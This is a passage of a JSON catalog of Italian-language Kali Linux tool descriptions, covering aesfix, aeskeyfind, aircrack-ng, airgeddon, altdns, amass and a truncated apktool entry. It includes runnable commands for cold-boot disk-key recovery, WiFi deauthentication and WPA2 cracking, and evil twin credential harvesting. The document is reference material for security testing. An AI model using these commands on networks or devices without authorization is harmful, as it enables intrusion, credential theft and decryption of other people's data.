    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Aesfix</strong> è uno strumento forense specializzato nel recupero di chiavi crittografiche AES da dump di memoria RAM potenzialmente corrotti. Sfrutta la struttura matematica dell'algoritmo AES, in particolare la ridondanza intrinseca nel key schedule (espansione della chiave), per correggere automaticamente errori a singolo bit (bit flip) che possono verificarsi durante l'acquisizione della memoria. Questo è fondamentale in scenari di cold boot attack dove il degrado della RAM introduce errori casuali proporzionali al tempo trascorso e alla temperatura.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Correzione Bit Flip:</strong> L'algoritmo analizza le relazioni matematiche tra i round key dell'espansione AES. Poiché ogni round key dipende dal precedente tramite operazioni XOR e S-box, un errore in un byte produce inconsistenze rilevabili e correggibili attraverso il teorema di ridondanza del key schedule.</p><p><strong>Supporto Multi-Keysize:</strong> Gestisce chiavi AES-128 (10 round), AES-192 (12 round) e AES-256 (14 round), adattando l'analisi alla struttura specifica di ciascun key schedule e al numero di round key generati.</p><p><strong>Integrazione con Aeskeyfind:</strong> Progettato per lavorare in pipeline con aeskeyfind: quest'ultimo estrae i candidati chiave dalla RAM, aesfix li valida e corregge se necessario.</p><p><strong>Verifica Integrità:</strong> Oltre alla correzione, valida matematicamente se una chiave è un key schedule AES legittimo, utile per filtrare falsi positivi da aeskeyfind.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Il tool accetta in input un file contenente una potenziale chiave AES (espansa o meno) e tenta la correzione.</p><pre><code># === CORREZIONE SINGOLA CHIAVE ===\n# Correzione chiave AES estratta\naesfix suspected_key.bin corrected_key.bin\n\n# Verifica senza correzione (dry-run)\naesfix --verify-only suspected_key.bin\n\n# === PIPELINE COMPLETA COLD BOOT ===\n# 1. Estrai tutte le chiavi candidate dal dump\naeskeyfind memory.dump > candidates.txt\n\n# 2. Correggi e valida ogni candidato\nwhile read key; do\n  echo $key | xxd -r -p > tmp.bin\n  if aesfix tmp.bin fixed.bin 2>/dev/null; then\n    echo \"[VALID] $(xxd -p fixed.bin)\"\n    cp fixed.bin \"keys/key_$(date +%s%N).bin\"\n  fi\ndone < candidates.txt\n\n# === WORKFLOW BITLOCKER ===\n# Dopo cold boot su sistema Windows con BitLocker\naeskeyfind -v memory.dump | tee all_keys.txt\ncat all_keys.txt | while read key; do\n  echo $key | xxd -r -p > key.bin\n  aesfix key.bin fixed.bin && \\\n    bdemount -k fixed.bin /dev/sda2 /mnt/bitlocker\ndone\n\n# === WORKFLOW LUKS ===\n# Per volumi LUKS (Linux)\nfor keyfile in keys/*.bin; do\n  cryptsetup luksOpen --key-file $keyfile /dev/sda1 decrypted && break\ndone</code></pre><p>L'output indica se la chiave era valida, corretta con successo (mostrando bit modificati), o irrecuperabile (troppi errori).</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Essenziale in <strong>Cold Boot Forensics</strong> quando si acquisisce RAM da sistemi con crittografia disco attiva (BitLocker, LUKS, FileVault, VeraCrypt). La finestra temporale per cold boot è 5-15 secondi a temperatura ambiente, estendibile a minuti con raffreddamento.</p><p>Dopo un cold boot attack, i bit flip sono comuni (1-5% dei bit dopo 30s) e aesfix permette di recuperare chiavi altrimenti inutilizzabili.</p><p>Utile in <strong>Memory Forensics</strong> generica quando si analizzano dump acquisiti con metodi non perfetti (DMA attack, crash dump, hibernation file).</p><p>Per <strong>Incident Response</strong>, permette di recuperare chiavi da memory dump di sistemi compromessi per analizzare dati cifrati dell'attaccante.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Utilizzo:</strong> Tool puramente offline, opera su file locali. Nessun impatto di rete o rilevamento.</p><p><strong>Limitazioni:</strong> Può correggere solo errori limitati (tipicamente 1-2 bit per word di 32 bit). Chiavi con corruzione >5% rimangono irrecuperabili.</p><p><strong>Legalità:</strong> L'uso per accedere a dati cifrati senza autorizzazione può violare leggi su accesso abusivo. Usare solo in contesti forensi autorizzati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Memory_Analysis"
    ],
    "notes": null
  },
  {
    "id": "aeskeyfind",
    "name": "aeskeyfind",
    "version": "1.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/aeskeyfind/",
    "desc": "Estrae chiavi AES da dump di memoria RAM cercando schedule di chiavi espanse.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>AESKeyFind</strong> è uno strumento forense specializzato nell'estrazione di chiavi di cifratura AES da dump di memoria volatile (RAM). Sfrutta una caratteristica intrinseca dell'algoritmo AES: durante l'uso, le chiavi vengono espanse in \"key schedules\" con pattern matematici riconoscibili (176 byte per AES-128, 208 per AES-192, 240 per AES-256). Il tool scansiona il dump cercando questi pattern, permettendo di recuperare chiavi anche da sistemi spenti o da immagini forensi, rendendo possibile la decifratura di volumi cifrati come BitLocker, TrueCrypt, VeraCrypt o FileVault.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Pattern Matching AES:</strong> Ricerca strutture di key schedule a 128, 192 e 256 bit nel dump di memoria. La matematica dell'espansione chiavi AES (Rijndael key schedule) crea pattern unici verificabili matematicamente che sopravvivono anche a parziale corruzione dei dati.</p><p><strong>Output Chiavi:</strong> Restituisce le chiavi candidate in formato esadecimale con offset nel file, pronte per essere testate su volumi cifrati o passate ad aesfix per correzione errori.</p><p><strong>Velocità:</strong> Ottimizzato con scansione lineare O(n), può processare 16GB di RAM in meno di 30 secondi su hardware moderno.</p><p><strong>Basso Falsi Positivi:</strong> La verifica matematica del key schedule riduce drasticamente i falsi positivi rispetto a ricerche entropy-based.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede un file di dump della memoria in formato raw.</p><pre><code># === ESTRAZIONE BASE ===\n# Estrazione chiavi AES da dump\naeskeyfind memory.dmp\n\n# Output verbose con offset in memoria\naeskeyfind -v memory.dmp\n\n# === FONTI DI MEMORY DUMP ===\n# Windows - DumpIt (acquisizione live)\nDumpIt.exe  # genera memory.raw\naeskeyfind memory.raw\n\n# Windows - hiberfil.sys (hibernation)\naeskeyfind /mnt/windows/hiberfil.sys\n\n# Windows - crash dump\naeskeyfind C:\\Windows\\MEMORY.DMP\n\n# Linux - LiME (acquisizione live)\nsudo insmod lime.ko \"path=/tmp/ram.lime format=raw\"\naeskeyfind /tmp/ram.lime\n\n# Linux - /dev/mem (richiede boot param)\naeskeyfind /dev/mem  # iomem=relaxed needed\n\n# macOS - osxpmem\nsudo osxpmem -o ram.aff4\naeskeyfind ram.aff4\n\n# === WORKFLOW COMPLETO ===\n# 1. Estrai chiavi candidate\naeskeyfind -v memory.dump > keys.txt\n\n# 2. Correggi eventuali bit flip\ncat keys.txt | while read offset key; do\n  echo $key | xxd -r -p > candidate.bin\n  aesfix candidate.bin fixed.bin 2>/dev/null && \\\n    echo \"$offset: $(xxd -p fixed.bin)\"\ndone > valid_keys.txt\n\n# 3. Testa chiavi su BitLocker\nfor key in $(cat valid_keys.txt | cut -d: -f2); do\n  echo $key | xxd -r -p > test.bin\n  bdemount -k test.bin /dev/sda2 /mnt/decrypted && break\ndone\n\n# === RICERCA SPECIFICA ===\n# Solo AES-256 (per BitLocker/VeraCrypt)\naeskeyfind -q memory.dmp | grep -E '^[0-9a-f]{64}$'</code></pre><p>Le chiavi trovate devono essere validate provando a decifrare il contenuto target. Tipicamente si trovano 1-5 chiavi candidate per sistema con FDE attivo.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Digital Forensics</strong>, dopo aver acquisito la RAM di un sistema sospetto (DumpIt, LiME, FTK Imager), aeskeyfind permette di recuperare chiavi di volumi cifrati senza bisogno della password utente.</p><p>Nel <strong>Cold Boot Attack</strong>, la RAM DDR3/DDR4 mantiene i dati per 5-15 secondi dopo lo spegnimento (estendibile a minuti con raffreddamento a -50°C), permettendo il recupero di chiavi.</p><p>Per <strong>Hibernation Analysis</strong>, hiberfil.sys contiene una copia compressa della RAM al momento dell'ibernazione, spesso con chiavi FDE ancora presenti.</p><p>In <strong>Incident Response</strong>, l'analisi di crash dump Windows (MEMORY.DMP) può rivelare chiavi usate da ransomware o malware per cifrare dati.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Limitazioni:</strong> Funziona solo se la chiave era in memoria al momento del dump. Sistemi con protezioni avanzate (Secure Boot, VBS, SGX enclaves) possono offuscare o isolare le chiavi.</p><p><strong>Contromisure:</strong> Windows 11 con VBS/Credential Guard isola le chiavi in memoria protetta. TPM-only BitLocker senza PIN non lascia chiavi in RAM utente.</p><p><strong>Legalità:</strong> L'accesso a dati cifrati senza autorizzazione è illegale. Tool destinato esclusivamente a forensics autorizzata.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Memory_Analysis"
    ],
    "notes": null
  },
  {
    "id": "aircrack-ng",
    "name": "aircrack-ng",
    "version": "1.7",
    "icon": "../app/icons/aircrack-ng-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/aircrack-ng/",
    "desc": "Suite completa per auditing reti WiFi: cattura pacchetti, deauth, crack WEP/WPA/WPA2.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Aircrack-ng</strong> è la suite standard de facto per il penetration testing di reti wireless 802.11a/b/g/n/ac. Composta da oltre 20 tool specializzati, copre l'intero ciclo di attacco: dalla messa in monitor mode dell'interfaccia, alla cattura del traffico, all'iniezione di pacchetti per accelerare la raccolta dati, fino al cracking offline delle chiavi WEP/WPA/WPA2/WPA3 (quest'ultimo con limitazioni). È il fondamento su cui si basano framework più automatizzati come Airgeddon, Wifite e Fluxion.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Airmon-ng:</strong> Configura le schede wireless in monitor mode e gestisce i processi interferenti (NetworkManager, wpa_supplicant).</p><p><strong>Airodump-ng:</strong> Scansiona e cattura il traffico wireless, identificando AP, client connessi, signal strength, canali e raccogliendo handshake WPA/WPA2 e PMKID.</p><p><strong>Aireplay-ng:</strong> Inietta pacchetti per forzare deautenticazioni (cattura handshake), fake authentication, ARP replay (WEP), chopchop e fragmentation attack.</p><p><strong>Aircrack-ng:</strong> Cracker offline. Attacca WEP statisticamente (PTW/KoreK) e WPA/WPA2 via dizionario con supporto SIMD (SSE2, AVX, AVX2, AVX512) per massime prestazioni CPU.</p><p><strong>Airdecap-ng:</strong> Decifra pacchetti WEP/WPA catturati una volta nota la chiave, permettendo l'analisi del traffico in chiaro.</p><p><strong>Airtun-ng:</strong> Crea interfacce tunnel virtuali per iniezione/cattura avanzata e attacchi MITM wireless.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Workflow tipico per WPA2:</p><pre><code># === SETUP MONITOR MODE ===\n# Kill processi interferenti e attiva monitor mode\nairmon-ng check kill\nairmon-ng start wlan0\n# Verifica: iwconfig wlan0mon\n\n# === SCANSIONE RETI ===\n# Scansione completa 2.4GHz + 5GHz\nairodump-ng wlan0mon --band abg\n\n# Scansione mirata solo WPA2 con info WPS\nairodump-ng wlan0mon --encrypt WPA2 --wps --manufacturer\n\n# === CATTURA HANDSHAKE ===\n# Target specifico su canale 6\nairodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon\n\n# Deauth broadcast (rumoroso ma efficace)\naireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon\n\n# Deauth mirato singolo client (più stealth)\naireplay-ng -0 3 -a AA:BB:CC:DD:EE:FF -c CC:DD:EE:FF:00:11 wlan0mon\n\n# Verifica handshake catturato\naircrack-ng capture-01.cap  # mostra se handshake presente\n\n# === CRACKING ===\n# CPU cracking con dizionario\naircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap\n\n# Converti per hashcat (GPU - 100x più veloce)\naircrack-ng -j hc22000_file capture-01.cap\nhashcat -m 22000 hc22000_file.hc22000 rockyou.txt -O -w 3 -d 1\n\n# === PMKID ATTACK (NO CLIENT NEEDED) ===\n# Cattura PMKID (funziona anche senza client connessi)\nhcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1 --filtermode=2\nhcxpcapngtool -o pmkid.hc22000 pmkid.pcapng\nhashcat -m 22000 pmkid.hc22000 wordlist.txt\n\n# === WEP ATTACK (legacy) ===\n# ARP replay per generare IV\naireplay-ng -3 -b AA:BB:CC:DD:EE:FF wlan0mon\n# Crack quando >50000 IV catturati\naircrack-ng -b AA:BB:CC:DD:EE:FF capture*.cap\n\n# === POST-EXPLOITATION ===\n# Decifra traffico catturato con chiave nota\nairdecap-ng -e \"NetworkName\" -p password123 capture-01.cap\n# Output: capture-01-dec.cap (traffico in chiaro)</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Essenziale in ogni <strong>Wireless Pentest</strong> per verificare la robustezza delle password WiFi aziendali contro attacchi dizionario.</p><p>Per <strong>Rogue AP Detection</strong>, airodump-ng identifica AP non autorizzati confrontando BSSID e ESSID con l'inventario aziendale.</p><p>Per testare <strong>802.11w (Management Frame Protection)</strong>, verifica se i client sono protetti da attacchi deauth.</p><p>In <strong>Red Team</strong>, la cattura di handshake enterprise (WPA2-Enterprise) permette attacchi offline su hash RADIUS/MSCHAPv2.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Deauth frames sono facilmente rilevabili da WIDS/WIPS (Cisco CleanAir, AirMagnet). Molti AP moderni loggano MAC address degli attaccanti.</p><p><strong>Stealth:</strong> Usare deauth singoli (non broadcast), attendere handshake passivamente, o preferire PMKID attack che non richiede deauth.</p><p><strong>Hardware:</strong> Schede consigliate: Alfa AWUS036ACH (AC), Alfa AWUS036ACM, TP-Link Archer T3U Plus. Verificare supporto driver per iniezione.</p><p><strong>Legalità:</strong> L'uso su reti non autorizzate è illegale. In Italia art. 617-quater c.p. (intercettazione abusiva).</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "airgeddon",
    "name": "airgeddon",
    "version": "11.51",
    "icon": "../app/icons/airgeddon-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/airgeddon/",
    "desc": "Script bash all-in-one per attacchi WiFi: evil twin, WPS, handshake capture, DoS wireless.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Airgeddon</strong> è un framework bash multi-uso che orchestra e semplifica l'uso di decine di tool wireless (aircrack-ng, hostapd, dnsmasq, bettercap, mdk4, hashcat, john, crunch, ecc.) attraverso un'interfaccia a menu guidata con oltre 100 opzioni. Automatizza attacchi complessi come Evil Twin con captive portal, KARMA attack, enterprise credential harvesting, permettendo anche a utenti meno esperti di eseguire penetration test wireless avanzati senza dover memorizzare comandi complessi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Evil Twin Attack:</strong> Crea un access point clone con captive portal per phishing delle credenziali WiFi. Include oltre 20 template personalizzabili per diverse lingue, ISP (Vodafone, TIM, Fastweb, ecc.) e router brands. Supporta HTTPS con certificati auto-generati.</p><p><strong>WPS Attacks:</strong> Integra Reaver, Bully e PixieWPS per attacchi a reti con WPS abilitato: PIN brute force (11000 tentativi), Pixie Dust (offline, istantaneo su chip vulnerabili), null PIN e PIN noti.</p><p><strong>Handshake Management:</strong> Cattura, pulisce (rimuove beacon inutili) e verifica handshake WPA/WPA2. Supporta cracking con aircrack-ng, hashcat (GPU), john, e generazione dizionari con crunch.</p><p><strong>DoS Wireless:</strong> Attacchi mdk4 avanzati: deauth (aireplay/mdk4), authentication flood, beacon flood, EAPOL logoff, Michael shutdown (TKIP).</p><p><strong>WPA3 Downgrade:</strong> Tenta di forzare client WPA3 a connettersi in WPA2 transition mode per catturare handshake crackabili.</p><p><strong>Enterprise Attacks:</strong> Evil Twin per WPA2-Enterprise con server RADIUS fake (hostapd-wpe) per catturare credenziali PEAP/MSCHAPv2.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Lanciare lo script e seguire i menu interattivi.</p><pre><code># === AVVIO BASE ===\nsudo airgeddon\n\n# === MENU PRINCIPALI ===\n# 1. Select interface\n# 2. Put interface in monitor mode\n# 3. Target selection (scan networks)\n# 4. Handshake/PMKID tools menu\n# 5. Offline WPA/WPA2 decrypt menu\n# 6. Evil Twin attacks menu\n# 7. WPS attacks menu\n# 8. Enterprise attacks menu\n# 9. DoS attacks menu\n\n# === EVIL TWIN WORKFLOW ===\n# Menu 6 > Option 9 (Evil Twin with captive portal)\n# 1. Seleziona rete target\n# 2. Scegli template captive portal\n# 3. Airgeddon: avvia hostapd + dnsmasq + lighttpd\n# 4. Deauth automatico sulla rete legittima\n# 5. Vittima si connette al fake AP\n# 6. Inserisce password nel captive portal\n# 7. Airgeddon valida la password contro handshake\n\n# === WPS PIXIE DUST ===\n# Menu 7 > Option 4 (Pixie Dust attack)\n# Funziona su router con chip Ralink, Realtek, Broadcom vulnerabili\n# Crack in secondi se vulnerabile\n\n# === ENTERPRISE CREDENTIAL HARVESTING ===\n# Menu 8 > Option 1 (Evil Twin for Enterprise)\n# Cattura username + hash MSCHAPv2\n# Crack offline con hashcat -m 5500</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Ideale per <strong>Wireless Pentesting</strong> rapido quando si ha poco tempo per setup manuali e si preferisce un'interfaccia guidata.</p><p>L'Evil Twin è particolarmente efficace in scenari di <strong>Social Engineering</strong> in luoghi pubblici (hotel, aeroporti, caffè) dove le vittime si connettono volontariamente a reti aperte.</p><p>Per <strong>WPA2-Enterprise Assessment</strong>, il modulo enterprise cattura credenziali aziendali sfruttando la mancata validazione dei certificati sui client.</p><p>Ottimo per <strong>Security Awareness Training</strong> e dimostrazioni live dei rischi del WiFi pubblico.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Evil Twin genera un secondo SSID identico, rilevabile da WIDS/WIPS enterprise. Il deauth continuo è molto visibile nei log.</p><p><strong>Dipendenze:</strong> Richiede ~30 tool esterni (verifica automatica all'avvio). Su Kali Linux la maggior parte sono preinstallati.</p><p><strong>Hardware:</strong> Richiede 2 schede WiFi per Evil Twin completo (una per AP fake, una per deauth). Schede consigliate: Alfa AWUS036ACH (supporta AP mode + monitor simultaneo su alcuni driver).</p><p><strong>Legalità:</strong> Evil Twin e credential harvesting sono reati gravi se non autorizzati (art. 615-ter e 640-ter c.p. in Italia).</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "altdns",
    "name": "altdns",
    "version": "1.0.2",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/altdns/",
    "desc": "Genera permutazioni di sottodomini e risolve DNS per scoprire host nascosti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Altdns</strong> estende la fase di subdomain enumeration generando permutazioni intelligenti dai sottodomini già noti. Se hai trovato <code>dev.example.com</code>, Altdns genererà varianti come <code>dev1</code>, <code>dev-api</code>, <code>staging-dev</code>, <code>devtest</code>, <code>dev-internal</code>, <code>dev.staging</code> e migliaia di altre combinazioni basate su pattern DevOps comuni. Poi risolve massivamente queste permutazioni per identificare quali esistono realmente, scoprendo asset shadow IT che sfuggono ai tool di enumerazione passiva.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Permutation Engine:</strong> Applica regole di mutazione intelligenti: prefissi (dev-, staging-, test-, uat-, prod-), suffissi (-api, -admin, -internal, -backup, -old), sostituzione numeri (1,2,01,02), inserimento separatori (-, _, .). Wordlist personalizzabili per target specifici.</p><p><strong>Mass Resolution:</strong> Risolve massivamente le permutazioni generate tramite DNS query parallele (record A/AAAA). Integrazione con massdns per performance massime (10k+ query/sec).</p><p><strong>Output Filtering:</strong> Esclude automaticamente wildcard DNS per evitare falsi positivi su domini che risolvono qualsiasi query (*.example.com).</p><p><strong>Deduplication:</strong> Rimuove duplicati automaticamente dall'output finale.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede una lista di sottodomini già scoperti e una wordlist di permutazioni.</p><pre><code># === PIPELINE BASE ===\n# 1. Raccogli sottodomini noti\nsubfinder -d target.com -silent | tee known.txt\namass enum -passive -d target.com >> known.txt\nsort -u known.txt -o known.txt\n\n# 2. Genera permutazioni\naltdns -i known.txt -o permuted.txt -w /usr/share/altdns/words.txt\n\n# 3. Risolvi con massdns (veloce)\nmassdns -r /usr/share/massdns/lists/resolvers.txt -t A -o S permuted.txt 2>/dev/null | \\\n  grep -v NXDOMAIN | cut -d' ' -f1 | sed 's/\\.$//' > resolved.txt\n\n# 4. Verifica host live\ncat resolved.txt | httpx -silent -threads 100 | tee live_hosts.txt\n\n# === WORDLIST CUSTOM PER DEVOPS ===\n# Crea wordlist ottimizzata\ncat > devops_words.txt << 'EOF'\ndev\nstaging\nuat\nprod\napi\nadmin\ninternal\nbackup\nold\nnew\ntest\nqa\ndemo\nsandbox\nEOF\n\naltdns -i known.txt -o permuted.txt -w devops_words.txt\n\n# === PIPELINE AVANZATA ===\n# Combina più fonti + permutazioni + vuln scan\n(\n  subfinder -d target.com -silent\n  amass enum -passive -d target.com 2>/dev/null\n  github-subdomains -d target.com -t $GITHUB_TOKEN 2>/dev/null\n) | sort -u | tee all_subs.txt | \\\n  altdns -i - -o - -w words.txt | \\\n  massdns -r resolvers.txt -t A -o S 2>/dev/null | \\\n  grep -oP '^[^ ]+' | sed 's/\\.$//' | sort -u | \\\n  httpx -silent | nuclei -t cves/ -t exposures/ -o vulns.txt\n\n# === ESEMPI PERMUTAZIONI ===\n# Input: api.example.com, dev.example.com\n# Output generato:\n# api-dev.example.com, dev-api.example.com\n# api1.example.com, api2.example.com, api-v2.example.com\n# staging-api.example.com, api-staging.example.com\n# api-internal.example.com, internal-api.example.com</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nella fase di <strong>Asset Discovery</strong>, dopo una prima enumerazione con Amass o Subfinder, Altdns trova i \"cugini\" dei sottodomini noti che seguono naming convention aziendali.</p><p>Spesso scopre ambienti <strong>Shadow IT</strong>: dev, staging, UAT o backup dimenticati che espongono vulnerabilità non presenti in produzione (debug mode, credenziali default, versioni obsolete).</p><p>Per <strong>Bug Bounty</strong>, la discovery di asset dimenticati è una delle tecniche più efficaci per trovare vulnerabilità uniche non già segnalate.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Genera milioni di query DNS. I DNS server target potrebbero loggare o rate-limitare. Usare resolver pubblici (Google, Cloudflare, Quad9) o liste di resolver aperti.</p><p><strong>Volume:</strong> 100 sottodomini input × 1000 parole wordlist = 100.000+ permutazioni. Prevedere tempo adeguato per resolution.</p><p><strong>Falsi Positivi:</strong> Wildcard DNS (*.domain.com) causa migliaia di falsi positivi. Sempre verificare con httpx/httprobe.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "amass",
    "name": "amass",
    "version": "4.2.0",
    "icon": "../app/icons/amass-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/amass/",
    "desc": "Enumerazione sottodomini avanzata con OSINT, brute force, scraping e graph mapping.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>OWASP Amass è il tool più completo e potente per la mappatura della superficie d'attacco esterna (Attack Surface Management). Combina tecniche passive (Certificate Transparency logs, API di terze parti come Shodan/Censys/SecurityTrails, web scraping, archivi DNS) con enumerazione attiva (DNS brute force, zone transfer, permutazioni) per costruire un grafo completo dei sottodomini, IP, ASN e relazioni di un'organizzazione. Il database a grafo integrato permette di tracciare i cambiamenti nel tempo e scoprire relazioni nascoste tra asset.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Enum Mode:</strong> Enumerazione completa che combina oltre 55 fonti di dati (VirusTotal, Shodan, Censys, SecurityTrails, PassiveTotal, RiskIQ, Spyse, ecc.) con risoluzione DNS, brute forcing e alterazioni automatiche.</p><p><strong>Intel Mode:</strong> Raccoglie informazioni sull'organizzazione: ASN, netblock, WHOIS, reverse WHOIS, domini correlati per registrant, name server e certificati SSL condivisi.</p><p><strong>Graph Database:</strong> Salva tutti i risultati in un database a grafo (Cayley/Neo4j), permettendo query complesse sulle relazioni tra asset e visualizzazione con D3.js, Gephi o Maltego.</p><p><strong>Tracking:</strong> Confronta scan successivi per identificare nuovi asset, modifiche all'infrastruttura o domini scaduti/riattivati (subdomain takeover potential).</p><p><strong>Scripting:</strong> Supporta script Lua custom per estendere le fonti dati e la logica di enumerazione.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Configurare le API key nel file config (~/.config/amass/config.ini) per massimizzare i risultati.</p><pre><code># === CONFIGURAZIONE API KEYS ===\n# ~/.config/amass/config.ini\n# [data_sources.VirusTotal]\n# apikey = YOUR_VT_KEY\n# [data_sources.Shodan]\n# apikey = YOUR_SHODAN_KEY\n# [data_sources.SecurityTrails]\n# apikey = YOUR_ST_KEY\n\n# === ENUMERAZIONE COMPLETA ===\n# Enum con tutte le fonti configurate\namass enum -d target.com -config ~/.config/amass/config.ini \\\n  -o results.txt -dir amass_output/ -timeout 60\n\n# === MODALITÀ PASSIVE (STEALTH) ===\n# Zero traffico verso il target\namass enum -passive -d target.com -src -ip -o passive_results.txt\n\n# === INTEL MODE - SCOPRI DOMINI CORRELATI ===\n# Trova tutti i domini dell'organizzazione\namass intel -org \"Target Corporation\" -whois -d target.com\n\n# Espandi da ASN\namass intel -asn 12345,67890 -o asn_domains.txt\n\n# Reverse WHOIS su registrant email\namass intel -whois -d target.com | grep -i registrant\n\n# === BRUTE FORCE AVANZATO ===\n# Brute con wordlist + alterazioni + resolver custom\namass enum -brute -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \\\n  -d target.com -rf resolvers.txt -wm -aw alterations.txt -max-dns-queries 500\n\n# === TRACKING CAMBIAMENTI ===\n# Scan iniziale\namass enum -d target.com -dir ./amass_baseline/\n# ... dopo alcuni giorni ...\namass track -d target.com -dir ./amass_baseline/ -last 2\n# Mostra nuovi sottodomini e modifiche\n\n# === VISUALIZZAZIONE ===\n# Grafo D3.js interattivo\namass viz -d3 -dir ./amass_output/ -o graph.html\n\n# Export per Maltego\namass viz -maltego -dir ./amass_output/ -o maltego.csv\n\n# Export per Gephi\namass db -names -dir ./amass_output/ | amass viz -gexf -\n\n# === PIPELINE BUG BOUNTY ===\namass enum -d target.com -o subs.txt -config config.ini && \\\n  cat subs.txt | httpx -silent -threads 200 | \\\n  nuclei -t cves/ -t exposures/ -t takeovers/ -o vulns.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Pilastro di ogni fase di <strong>External Reconnaissance</strong> per mappare l'intera superficie d'attacco di un'organizzazione.</p><p>Per <strong>Bug Bounty</strong>, Amass è il gold standard per scope discovery. La combinazione di fonti passive trova asset che altri tool perdono.</p><p>Nella <strong>Threat Intelligence</strong>, permette di monitorare l'espansione dell'infrastruttura di gruppi APT e criminali, correlando domini tramite registrant/nameserver.</p><p>Per <strong>M&amp;A Due Diligence</strong>, mappa rapidamente tutti gli asset digitali di un'azienda target.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> La modalità passiva è completamente stealth (nessun traffico verso il target). La modalità attiva (brute) genera traffico DNS sostanziale e può essere rilevata/bloccata.</p><p><strong>Rate Limiting:</strong> Senza API key, le fonti commerciali (Shodan, SecurityTrails, ecc.) limiteranno le query. Investire in API key per risultati completi.</p><p><strong>Tempo:</strong> Scan completi su grandi organizzazioni possono richiedere ore. Usare -timeout e -max-dns-queries per controllare.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "apktool",
    "name": "apktool",
    "version": "2.7.0",
    "icon": "../app/icons/apktool-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/apktool/",
    "desc": "Decompila e ricompila APK Android, permettendo analisi e modifica del codice smali.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Apktool</strong> è lo strumento fondamentale per il reverse engineering di applicazioni Android. Permette di decompilare un file APK nei suoi componenti originali: codice smali (assembly Dalvik/ART), risorse XML, AndroidManifest.xml, assets e file di configurazione. Dopo l'analisi o la modifica, può ricompilare il tutto in un APK funzionante. È essenziale per l'analisi di malware mobile, la ricerca di vulnerabilità, il bypass di controlli di sicurezza e il patching di applicazioni.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Decompilazione:</strong> Estrae tutte le risorse (immagini, layout XML, stringhe, raw assets) nel formato originale e converte il bytecode DEX in codice smali leggibile. Decodifica AndroidManifest.xml in formato leggibile.</p><p><strong>Ricompilazione:</strong> Riassembla i file modificati in un APK valido, gestendo automaticamente la compressione AAPT2, allineamento e struttura corretta.</p><p><strong>Framework Management:</strong> Gestisce i framework di sistema (framework-res.apk, SystemUI.apk) necessari per decompilare app che dipendono da risorse OEM specifiche (Samsung, Xiaomi, ecc.).</p><p><strong>Debugging Support:</strong> Può inserire flag di debug nell'APK ricompilato per permettere debugging con Android Studio.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === DECOMPILAZIONE ===\n# Decompilazione 